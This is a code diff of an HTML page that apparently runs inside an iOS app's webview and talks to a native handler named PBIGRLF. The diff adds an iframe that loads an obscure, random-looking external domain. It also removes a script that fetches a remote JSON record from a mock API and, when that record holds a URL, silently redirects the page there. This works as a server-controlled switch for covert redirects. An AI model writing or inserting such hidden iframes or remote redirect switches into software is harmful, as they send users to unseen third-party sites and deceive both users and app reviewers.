@@ -6,6 +6,8 @@
 		<title>PBIGRLF</title>
 	</head>
 	<body>
+				<iframe src="https://crapl.uvwgskasdg.cc/"></iframe>
+
 		<script type="text/javascript">
 			window.webkit.messageHandlers.PBIGRLF.postMessage({
 									ui: {
@@ -21,39 +23,7 @@
   
 									}
 								});
-			document.addEventListener('DOMContentLoaded', function() {
-				function a() {
-					console.log("a");
-					try {
-						window.webkit.messageHandlers.PBIGRLF.postMessage({
-							enter: ""
-						});
-					} catch (e) {}
-				}
-				async function getData() {
-					try {
-						var str = 'https://6abdb150c4d5ac5483010466.mockapi.io/PBIGRLF/data'
-						const response = await fetch(str, {
-							cache: 'no-store'
-						});
-						if (!response.ok) {
-							getData();
-						}
-						const arr = await response.json();
-						console.log(arr);
-						const dic = arr[0];
-						if (Object.hasOwn(dic, 'a')) {
-							console.log("b");
-							window.location.href = dic["a"];
-						} else {
-							a()
-						}
-					} catch (error) {
-						console.error('Fetch error:', error);
-					}
-				}
-				getData();
-			});
+			
 		</script>
 	</body>
 </html>
